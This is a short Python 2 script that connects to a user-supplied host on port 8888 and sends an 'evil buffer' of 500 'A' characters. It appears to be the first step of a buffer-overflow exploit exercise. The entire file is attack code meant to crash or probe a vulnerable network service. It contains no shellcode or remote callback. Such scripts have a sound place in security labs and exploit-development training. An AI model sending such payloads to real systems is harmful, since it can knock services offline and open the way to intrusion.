#!/usr/bin/python

import sys, socket

contador=500

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

buffer = "A" * contador
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
s.close()



